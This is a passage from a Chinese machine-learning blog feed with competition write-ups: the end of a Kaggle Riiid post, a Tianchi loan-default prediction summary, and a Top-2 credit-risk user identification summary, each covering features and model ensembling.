src="https://pic.logicjake.xyz/kaggle_riiid_2.png" alt="图2">  </p><p>但是在上学的时候，老师应该教过我们：遇到不会的题目先跳过，过一会再做。task_container_id 不连续的原因就在于此，以图3为例，用户做到 task_container_id 为1的题目时发现题目不会做，所以先行跳过做 task_container_id 为2的题目。task_container_id 为2的题目比较简单，做完之后再返回去攻克 task_container_id 为1的题目。这就导致了 task_container_id 不随着 timestamp 自增的现象。根据这个现象我们可以构造一个强特：当前题目所属 task_container_id 和之前一批题目的 task_container_id 的差值，差值的绝对值越大，代表回答这次题目时跳过的越多。<strong>这个特征提升约1.5k</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 求和上批题目 task_container_id 的差值</span><br><span class="line">utci[cnt] &#x3D; task_container_id - u_task_container_id_dict[user_id]</span><br><span class="line"></span><br><span class="line"># 更新最新批题目的 task_container_id </span><br><span class="line">if task_container_id !&#x3D; u_task_container_id_dict[user_id]:</span><br><span class="line">    u_task_container_id_dict[user_id] &#x3D; task_container_id</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://pic.logicjake.xyz/kaggle_riiid_3.png" alt="图3" title="">                </div>                <div class="image-caption">图3</div>            </figure><h3 id="用户和题目组合特征"><a href="#用户和题目组合特征" class="headerlink" title="用户和题目组合特征"></a>用户和题目组合特征</h3><p>用户和题目的交叉特征非常有用，但受限于二者交叉之后巨大维度带来的内存问题，只构造了2个特征，且都需要特殊的数据结构减少内存占用。</p><p><a href="https://www.kaggle.com/c/riiid-test-answer-prediction/discussion/194266" target="_blank" rel="noopener">这则帖子</a>发现用户会重复回答某些问题，所以可以构造特征：用户第几次回答这个问题。如果采用之前的字典方式，user_id 和 content_id 交互后 key 的数量十分巨大，十分占内存。经原贴评论区大佬指导，可以采用 bitarray 这个数据结构退而求其次记录用户之前是否做过这个题目。每个用户维护长度为14000的 bitarray，content_id 因为已经是从0开始的连续值，所以可以用下标查询的方式确定 bitarry 对应位置是否为1。<strong>该特征提升幅度4个k。</strong></p><p>之前也说过时间差是个很重要的特征，所以继续构造用户距离上次回答该问题的时间差，如果时间差比较短，那么用户可能记忆比较深刻，做错的概率也较小。构造这个特征就没办法使用 bitarray 了，还是得延续之前的字典做法。之前字典爆内存的原因在于 key 过多，所以我们采用 LRU 缓存的方式，只维护指定长度的字典，一旦新加入记录时字典满了，直接删除最近最少使用的记录。python 的数据结构 OrderedDict 有个特性，他会按照 key 加入的顺序排序。所以我们每次查询一条记录，如果该记录存在，则把他从 OrderedDict 中删除，再重新添加到 OrderedDict 中去，这样 OrderedDict 的末尾保存的就是最近使用的记录。同样当字典满了，直接删除第一条记录，就可以起到删除最近最少使用的记录的作用。<strong>该特征提升幅度2个k。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class LRUCache(OrderedDict):</span><br><span class="line">    def __init__(self, capacity&#x3D;100):</span><br><span class="line">        self.capacity &#x3D; capacity</span><br><span class="line">        self.cache &#x3D; OrderedDict()</span><br><span class="line"></span><br><span class="line">    def get(self, key):</span><br><span class="line">        if key in self.cache:</span><br><span class="line">            value &#x3D; self.cache.pop(key)</span><br><span class="line">            self.cache[key] &#x3D; value</span><br><span class="line">        else:</span><br><span class="line">            value &#x3D; -1</span><br><span class="line"></span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    def set(self, key, value):</span><br><span class="line">        if key in self.cache:</span><br><span class="line">            value &#x3D; self.cache.pop(key)</span><br><span class="line">            self.cache[key] &#x3D; value</span><br><span class="line">        else:</span><br><span class="line">            if len(self.cache) &#x3D;&#x3D; self.capacity:</span><br><span class="line">                self.cache.popitem(last&#x3D;False)</span><br><span class="line">                self.cache[key] &#x3D; value</span><br><span class="line">            else:</span><br><span class="line">                self.cache[key] &#x3D; value</span><br></pre></td></tr></table></figure><h1 id="模型融合"><a href="#模型融合" class="headerlink" title="模型融合"></a>模型融合</h1><p>最终模型选用 LGB 融合<a href="https://www.kaggle.com/gilfernandes/riiid-self-attention-transformer" target="_blank" rel="noopener">开源</a>的0.77的 transformer 模型，0.75 * LGB 预测概率 + 0.25 * NN 预测概率，融合大概能带来3k的提升。</p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/01/08/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E9%87%91%E8%9E%8D%E9%A3%8E%E6%8E%A7-%E8%B4%B7%E6%AC%BE%E8%BF%9D%E7%BA%A6%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[零基础入门金融风控-贷款违约预测-赛后总结]]></title>
        <updated>2021-02-07T07:49:48+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/01/08/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E9%87%91%E8%9E%8D%E9%A3%8E%E6%8E%A7-%E8%B4%B7%E6%AC%BE%E8%BF%9D%E7%BA%A6%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/01/08/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E9%87%91%E8%9E%8D%E9%A3%8E%E6%8E%A7-%E8%B4%B7%E6%AC%BE%E8%BF%9D%E7%BA%A6%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：11 / 4780<br>比赛地址：<a href="https://tianchi.aliyun.com/competition/entrance/531830/introduction" target="_blank" rel="noopener">https://tianchi.aliyun.com/competition/entrance/531830/introduction</a><br>开源地址：<a href="https://github.com/LogicJake/tianchi-loan-default-prediction-top11" target="_blank" rel="noopener">https://github.com/LogicJake/tianchi-loan-default-prediction-top11</a></p><p>这个比赛属于天池办的一系列入门赛的其一，没奖金只有一些小奖品，所以竞争很小。总的来说该方案没有什么耀眼的操作，就是简单的数据处理，暴力特征工程和模型融合，单纯看好久没更博文了，发上来凑个数。</p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>赛题以金融风控中的个人信贷为背景，要求选手根据贷款申请人的数据信息预测其是否有违约的可能，以此判断是否通过此项贷款，这是一个典型的分类问题。</p><h1 id="数据介绍"><a href="#数据介绍" class="headerlink" title="数据介绍"></a>数据介绍</h1><p>赛题以预测用户贷款是否违约为任务，数据集报名后可见并可下载，该数据来自某信贷平台的贷款记录，总数据量超过120w，包含47列变量信息，其中15列为匿名变量。为了保证比赛的公平性，将会从中抽取80万条作为训练集，20万条作为测试集A，20万条作为测试集B，同时会对employmentTitle、purpose、postCode和title等信息进行脱敏。  </p><table><thead><tr><th align="center">Field</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">id</td><td align="center">为贷款清单分配的唯一信用证标识</td></tr><tr><td align="center">loanAmnt</td><td align="center">贷款金额</td></tr><tr><td align="center">term</td><td align="center">贷款期限（year）</td></tr><tr><td align="center">interestRate</td><td align="center">贷款利率</td></tr><tr><td align="center">installment</td><td align="center">分期付款金额</td></tr><tr><td align="center">grade</td><td align="center">贷款等级</td></tr><tr><td align="center">subGrade</td><td align="center">贷款等级之子级</td></tr><tr><td align="center">employmentTitle</td><td align="center">就业职称</td></tr><tr><td align="center">employmentLength</td><td align="center">就业年限（年）</td></tr><tr><td align="center">homeOwnership</td><td align="center">借款人在登记时提供的房屋所有权状况</td></tr><tr><td align="center">annualIncome</td><td align="center">年收入</td></tr><tr><td align="center">verificationStatus</td><td align="center">验证状态</td></tr><tr><td align="center">issueDate</td><td align="center">贷款发放的月份</td></tr><tr><td align="center">purpose</td><td align="center">借款人在贷款申请时的贷款用途类别</td></tr><tr><td align="center">postCode</td><td align="center">借款人在贷款申请中提供的邮政编码的前3位数字</td></tr><tr><td align="center">regionCode</td><td align="center">地区编码</td></tr><tr><td align="center">dti</td><td align="center">债务收入比</td></tr><tr><td align="center">delinquency_2years</td><td align="center">借款人过去2年信用档案中逾期30天以上的违约事件数</td></tr><tr><td align="center">ficoRangeLow</td><td align="center">借款人在贷款发放时的fico所属的下限范围</td></tr><tr><td align="center">ficoRangeHigh</td><td align="center">借款人在贷款发放时的fico所属的上限范围</td></tr><tr><td align="center">openAcc</td><td align="center">借款人信用档案中未结信用额度的数量</td></tr><tr><td align="center">pubRec</td><td align="center">贬损公共记录的数量</td></tr><tr><td align="center">pubRecBankruptcies</td><td align="center">公开记录清除的数量</td></tr><tr><td align="center">revolBal</td><td align="center">信贷周转余额合计</td></tr><tr><td align="center">revolUtil</td><td align="center">循环额度利用率，或借款人使用的相对于所有可用循环信贷的信贷金额</td></tr><tr><td align="center">totalAcc</td><td align="center">借款人信用档案中当前的信用额度总数</td></tr><tr><td align="center">initialListStatus</td><td align="center">贷款的初始列表状态</td></tr><tr><td align="center">applicationType</td><td align="center">表明贷款是个人申请还是与两个共同借款人的联合申请</td></tr><tr><td align="center">earliesCreditLine</td><td align="center">借款人最早报告的信用额度开立的月份</td></tr><tr><td align="center">title</td><td align="center">借款人提供的贷款名称</td></tr><tr><td align="center">policyCode</td><td align="center">公开可用的策略_代码=1新产品不公开可用的策略_代码=2</td></tr><tr><td align="center">n系列匿名特征</td><td align="center">匿名特征n0-n14，为一些贷款人行为计数特征的处理</td></tr></tbody></table><p>提交结果为每个测试样本是1的概率，也就是y为1的概率。评价方法为AUC评估模型效果。</p><h1 id="方案总结"><a href="#方案总结" class="headerlink" title="方案总结"></a>方案总结</h1><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>原数据中有贷款等级和贷款等级之子级两个类别特征，但因为有明显的大小关系，所以需要将其映射为数值。贷款等级范围为“A-G”，将其映射为“1-7”。子级在每个等级上又细分了5个数字等级，所以用“等级×5+细分等级”映射。</p><p>就业年限（年）特征也是具有明显大小关系的类别特征。首先将“10+ years”替换成“10 years”，“&lt; 1 year”替换成“0 years”。随后提取数字年份为新特征。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><h3 id="业务特征"><a href="#业务特征" class="headerlink" title="业务特征"></a>业务特征</h3><p>业务特征就做了两个没细挖。用贷款发放的年份减去借款人最早报告的信用额度开立的年份可以大致得到借款人的年龄（？）。贷款金额除以贷款期限（year）可以得到每年的负债，再除以年收入可以得到年负债比。</p><h3 id="暴力特征"><a href="#暴力特征" class="headerlink" title="暴力特征"></a>暴力特征</h3><p>暴力特征主要围绕类别特征展开，对类别特征进行批量无筛选式的特征构造。主要进行了一阶和二阶组合下的 count 运算。</p><p>也对数值特征进行了二阶相加构造，但对模型没有提升就删去了。</p><h3 id="欺诈率"><a href="#欺诈率" class="headerlink" title="欺诈率"></a>欺诈率</h3><p>类比点击率特征，针对是否会欺诈的01标签，同样也可以利用五折交叉统计计算欺诈率特征。欺诈率以类别为单位统计，所以同样可以对类别特征进行一阶和二阶下的暴力构造。</p><h2 id="模型融合"><a href="#模型融合" class="headerlink" title="模型融合"></a>模型融合</h2><p>模型融合采用树模型三兄弟：LightGBM，Xgboost和Catboost。融合方式采用指数加权融合，三个模型的权重都是0.5。</p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/10/01/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BF%BC%E6%94%AF%E4%BB%98%E6%9D%AF%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E4%BF%A1%E7%94%A8%E9%A3%8E%E9%99%A9%E7%94%A8%E6%88%B7%E8%AF%86%E5%88%AB-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[第二届翼支付杯大数据建模大赛信用风险用户识别-Top2 赛后总结]]></title>
        <updated>2021-02-07T07:49:48+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/10/01/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BF%BC%E6%94%AF%E4%BB%98%E6%9D%AF%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E4%BF%A1%E7%94%A8%E9%A3%8E%E9%99%A9%E7%94%A8%E6%88%B7%E8%AF%86%E5%88%AB-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/10/01/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BF%BC%E6%94%AF%E4%BB%98%E6%9D%AF%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E4%BF%A1%E7%94%A8%E9%A3%8E%E9%99%A9%E7%94%A8%E6%88%B7%E8%AF%86%E5%88%AB-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：2 / 392<br>比赛地址：<a href="https://www.dcjingsai.com/v2/cmptDetail.html?id=410" target="_blank" rel="noopener">https://www.dcjingsai.com/v2/cmptDetail.html?id=410</a><br>源码：<a href="https://github.com/LogicJake/2020-yizhifu-credit-risk-user-identification-Top2" target="_blank" rel="noopener">https://github.com/LogicJake/2020-yizhifu-credit-risk-user-identification-Top2</a>  </p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>央行发布《金融科技FinTech》报告，强调金融科技成为推动金融转型升级的新引擎，成为促进普惠金融发展的新机遇。运用大数据、人工智能等技术建立金融风控模型，有效甄别高风险交易，智能感知异常交易，实现风险早识别、早预警、早处置，提升金融风险技防能力，是 “金融+科技”成果的显著体现。</p><a id="more"></a><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><p>信用风险用户识别，本次比赛采用auc对结果进行评分。</p><h1 id="数据介绍"><a href="#数据介绍" class="headerlink" title="数据介绍"></a>数据介绍</h1><details><summary>详细数据字段说明</summary><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><table><thead><tr><th>字段名</th><th>字段说明（数据经过脱敏处理）</th></tr></thead><tbody><tr><td>user</td><td>样本编号，e.g., Train_00000、Train_00001…</td></tr><tr><td>sex</td><td>性别，编码后取值为：category 0、category1</td></tr><tr><td>age</td><td>年龄，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>provider</td><td>运营商类型，编码后取值为：category 0、category 1…</td></tr><tr><td>level</td><td>用户等级，编码后取值为：category 0、category 1…</td></tr><tr><td>verified</td><td>是否实名，编码后取值为：category 0、category1</td></tr><tr><td>using_time</td><td>使用时长，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>regist_type</td><td>注册类型，编码后取值为：category 0、category 1…</td></tr><tr><td>card_a_cnt</td><td>a类型卡的数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>card_b_cnt</td><td>b类型卡的数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>card_c_cnt</td><td>c类型卡的数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>card_d_cnt</td><td>d类型卡的数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>op1_cnt</td><td>某类型1操作数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>op2_cnt</td><td>某类型2操作数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>service1_cnt</td><td>某业务1产生数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>service1_amt</td><td>某业务1产生金额，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>service2_cnt</td><td>某业务2产生数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>agreement_total</td><td>开通协议数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>agreement1</td><td>是否开通协议1，编码后取值为：category 0、category1</td></tr><tr><td>agreement2</td><td>是否开通协议2，编码后取值为：category 0、category1</td></tr><tr><td>agreement3</td><td>是否开通协议3，编码后取值为：category 0、category1</td></tr><tr><td>agreement4</td><td>是否开通协议4，编码后取值为：category 0、category1</td></tr><tr><td>acc_count</td><td>账号数量，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>login_cnt_period1</td><td>某段时期1的登录次数，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>login_cnt_period2</td><td>某段时期2的登录次数，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>ip_cnt</td><td>某段时期登录ip个数，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>login_cnt_avg</td><td>某段时期登录次数均值，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>login_days_cnt</td><td>某段时期登录天数，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>province</td><td>省份，处理成类别编码</td></tr><tr><td>city</td><td>城市，处理成类别编码</td></tr><tr><td>balance</td><td>余额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>balance_avg</td><td>近某段时期余额均值等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>balance1</td><td>类型1余额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>balance1_avg</td><td>近某段时期类型1余额均值等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>balance2</td><td>类型2余额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>balance2_avg</td><td>近某段时期类型2余额均值等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>service3</td><td>是否服务3用户，编码后取值为：category 0、category1</td></tr><tr><td>service3_level</td><td>服务3等级，编码后取值为：category 0、category1…</td></tr><tr><td>product1_amount</td><td>产品1金额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>product2_amount</td><td>产品2金额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>product3_amount</td><td>产品3金额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>product4_amount</td><td>产品4金额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>product5_amount</td><td>产品5金额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>product6_amount</td><td>产品6金额等级，处理成保留大小关系的类别编码：level 1、level2… 例如：level 2 &gt; level 1</td></tr><tr><td>product7_cnt</td><td>产品7申请次数，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>product7_fail_cnt</td><td>产品7申请失败次数，处理后仅保留大小关系，为某一区间的整数</td></tr></tbody></table><h2 id="操作信息"><a href="#操作信息" class="headerlink" title="操作信息"></a>操作信息</h2><table><thead><tr><th>字段名</th><th>字段说明（数据经过脱敏处理）</th></tr></thead><tbody><tr><td>user</td><td>样本编号，e.g., Train_00000、Train_00001…</td></tr><tr><td>op_type</td><td>操作类型编码，处理成类别编码</td></tr><tr><td>op_mode</td><td>操作模式编码，处理成类别编码</td></tr><tr><td>op_device</td><td>操作设备编码，处理成类别编码</td></tr><tr><td>ip</td><td>设备ip编码，处理成类别编码</td></tr><tr><td>net_type</td><td>网络类型编码，处理成类别编码</td></tr><tr><td>channel</td><td>渠道类型编码，处理成类别编码</td></tr><tr><td>ip_3</td><td>设备ip前三位编码，处理成类别编码</td></tr><tr><td>tm_diff</td><td>距离某起始时间点的时间间隔，处理成如下格式。例如： 9 days 09:02:45.000000000，表示距离某起始时间点9天9小时2分钟45秒</td></tr></tbody></table><h2 id="交易信息"><a href="#交易信息" class="headerlink" title="交易信息"></a>交易信息</h2><table><thead><tr><th>字段名</th><th>字段说明（数据经过脱敏处理）</th></tr></thead><tbody><tr><td>user</td><td>样本编号，e.g., Train_00000、Train_00001…</td></tr><tr><td>platform</td><td>平台类型编码，处理成类别编码</td></tr><tr><td>tunnel_in</td><td>来源类型编码，处理成类别编码</td></tr><tr><td>tunnel_out</td><td>去向类型编码，处理成类别编码</td></tr><tr><td>amount</td><td>交易金额，处理后仅保留大小关系，为某一区间的整数</td></tr><tr><td>type1</td><td>交易类型1编码，处理成类别编码</td></tr><tr><td>type2</td><td>交易类型2编码，处理成类别编码</td></tr><tr><td>ip</td><td>设备ip编码，处理成类别编码</td></tr><tr><td>ip_3</td><td>设备ip前三位编码，处理成类别编码</td></tr><tr><td>tm_diff</td><td>距离某起始时间点的时间间隔，处理成如下格式。例如： 9 days 09:02:45.000000000，表示距离某起始时间点9天9小时2分钟45秒</td></tr></tbody></table></details> <h1 id="方案总结"><a href="#方案总结" class="headerlink" title="方案总结"></a>方案总结</h1><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><p>特征工程之前先进行了一波预处理，数据介绍里说过所给数据进行了高度匿名化，因此引入了一些不合理性。比如余额等级这个特征被转换成类别编码，但同时存在大小关系：level 2 &gt; level 1。如果将其不处理作为类别特征输入，模型无法学习到之间的大小关系，所以我将其中的数字提取出来作为数值特征，能帮助模型提高9个w。特征工程围绕基础数据的交叉衍生，群体黑样本比例，操作行为特征和交易行为特征展开。</p><h3 id="基础特征"><a href="#基础特征" class="headerlink" title="基础特征"></a>基础特征</h3><p>基础数据分为两大类：数值特征和类别特征。对所有的数值特征进行一波二阶相加，另外结合对数据的理解，进行了一些细致的二阶或者三阶的相加或相除运算。在这一步可以构造出一个强有力的特征：用户产品7申请失败比率（用户申请失败次数/用户申请次数），在正常用户和异常用户上的分布如图1所示，该特征可以帮助模型提升3个k。我猜测翼支付本身肯定有一套风险控制系统，对于潜在的风险用户提高了准入门槛，使得特定产品的申请失败率相较于正常用户较高。另外正常用户和风险用户偏好的登录时段也不一样，如图2和图3所示，正常用户更多地在时期1登录，而风险用户则在时期2登录。类别特征可以用拼接进行二阶交叉，也可以计数反应类别热度。</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E7%94%A8%E6%88%B7%E4%BA%A7%E5%93%817%E5%A4%B1%E8%B4%A5%E6%AF%94%E4%BE%8B.png" alt="图1 用户产品7申请失败比率分布。橘黄色代表风险用户，蓝色代表正常用户" title="">                </div>                <div class="image-caption">图1 用户产品7申请失败比率分布。橘黄色代表风险用户，蓝色代表正常用户</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E7%99%BB%E5%BD%95%E6%97%B6%E6%AE%B51.png" alt="图2 登录时段2分布。橘黄色代表风险用户，蓝色代表正常用户" title="">                </div>                <div class="image-caption">图2 登录时段2分布。橘黄色代表风险用户，蓝色代表正常用户</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E7%99%BB%E5%BD%95%E6%97%B6%E6%AE%B52.png" alt="图3 登录时段1分布。橘黄色代表风险用户，蓝色代表正常用户" title="">                </div>                <div class="image-caption">图3 登录时段1分布。橘黄色代表风险用户，蓝色代表正常用户</div>            </figure></div><h3 id="群体黑样本比例"><a href="#群体黑样本比例" class="headerlink" title="群体黑样本比例"></a>群体黑样本比例</h3><p>之前参加过的反欺诈或者风控比赛，对群体的识别都比较有效。一般欺诈行为都是团队作战，位于同一个区域或者使用同一种价格低廉的手机。所以可以根据省份，城市，设备等属性划分群体，甚至两两属性组合进一步细分群体。划分群体之后，对群体样本进行五折交叉统计，得到群体的黑样本比率，或者称该群体发生违约风险的概率。该特征作为先验知识帮助模型提高识别准确率。图4和图5可以看出，不同群体之间的黑样本比率相差较大，在真实的业务场景中，可以针对不同的群体用户，采取不同等级的审核力度，从而尽可能减少风险用户。以设备和年龄组合这个细分群体来说，每个年龄段都有其偏好的手机类型，比如年轻人可能偏好于华为或者苹果，而老年人可能倾向于价格便宜的OPPO或者vivo（仅做举例，不一定准确）。但对一欺诈团队，其不一定符合这一现象，比如他们的设备往往可能是统一采购的低廉机型，从而出现与其年龄段不相称的使用机型，通过这一细分群体的划分可以帮助我们定位风险用户群体。</p><div style="margin: auto;width:60%"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E8%AE%BE%E5%A4%87%E7%BE%A4%E4%BD%93.png" alt="图4 不同设备群体黑样本比例" title="">                </div>                <div class="image-caption">图4 不同设备群体黑样本比例</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E5%9F%8E%E5%B8%82%E7%BE%A4%E4%BD%93.png" alt="图5 不同城市用户群体黑样本比例" title="">                </div>                <div class="image-caption">图5 不同城市用户群体黑样本比例</div>            </figure></div><h3 id="操作行为特征"><a href="#操作行为特征" class="headerlink" title="操作行为特征"></a>操作行为特征</h3><p>对操作行为表主要是进行时空特征统计，具体流程如图6所示。这组特征主要使用pivot_table完成，所以构造的特征维度较高。另外在时间维度上，采取滑窗选取样本进行细化统计，比如用户最近15天进行过多少次操作类型为×××的操作。</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E6%93%8D%E4%BD%9C%E8%A1%8C%E4%B8%BA%E7%89%B9%E5%BE%81.png" alt="图6 操作行为特征构造思路" title="">                </div>                <div class="image-caption">图6 操作行为特征构造思路</div>            </figure></div><h3 id="交易行为特征"><a href="#交易行为特征" class="headerlink" title="交易行为特征"></a>交易行为特征</h3><p>交易行为特征的构造和操作行为特征差不多，具体流程如图7所示，只不过交易行为相较于操作行为多了一个很重要的特征：交易额。操作行为特征主要是计算多少次操作（count），而交易行为特征围绕交易额进行了一系列时间，空间或者时空维度的统计，比如：用户在××平台上交易额的平均值，最大值，用户最近15天交易额的平均值，总和，用户最近3天进行交易类型1的交易额的总和…</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E4%BA%A4%E6%98%93%E8%A1%8C%E4%B8%BA%E7%89%B9%E5%BE%81.png" alt="图7 交易行为特征构造思路" title="">                </div>                <div class="image-caption">图7 交易行为特征构造思路</div>            </figure></div><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>模型方面没有使用过多繁杂的融合手段。初赛时候构造特征比较细致，特征的测试维度都是以个计算，追求线上和线下的一致性，避免过拟合。复赛由于入场较晚，没有过多的时间测试，所以测试维度都是以组为单位进行，生成的特征维度较高，但模型效果提升很快。所以最后采用了两套特征工程，一套是初赛方案，保证整体的鲁棒性，另外一套是复赛的梭哈版本，极大提高了模型效果。对两套特征工程分别使用lgb和xgb模型生成4个概率文件，使用指数加权融合得到最后的提交结果。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>初赛的时候由于平台算分bug，导致和前排分数差异太大，所以早早放弃保平安了。复赛再参与进来，剩余时间不多，也错过了组队机会，这一题感觉如果有队友融合提升应该很明显。自己没有队友融合，所以最后死马当作活马医，和初赛方案尝试融合了一下，没想到竟然比模型差异融合带来的效果还好。</p><p>决赛答辩的时候，很多队伍都提到了对行为数据提取序列特征，但word2vec，tfidf和countvec在我这边效果都不好，只有初赛的时候对amount做word2vec有点提升。可能是因为暴力梭哈特征维度太高了，已经包含了序列特征能反映的信息。所以比赛还是有队友差异性融合比较好，所有的思路不要都放在一个方案里。</p><p>比赛过程还尝试过其他思路，比如伪标签，但预测出来的概率值普遍不高，都没有超过0.9，所以放弃了。另外由于序列行为的存在，尝试了一波基于LSTM的nn建模，但效果也不好，融合也没有提升。</p><p>这题的数据格式倒是好像挺常见，之前参与的2020腾讯游戏安全技术竞赛机器学习组赛题数据与之类似。此外本次比赛第一名大佬在答辩时提到的将操作行为和交易行为融合成一张大表做统计的思路挺好的，自己比赛时没有想到。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.logicjake.xyz/2020/04/16/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BB%84-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/">2020腾讯游戏安全技术竞赛机器学习组-TOP 4赛后总结</a></li><li><a 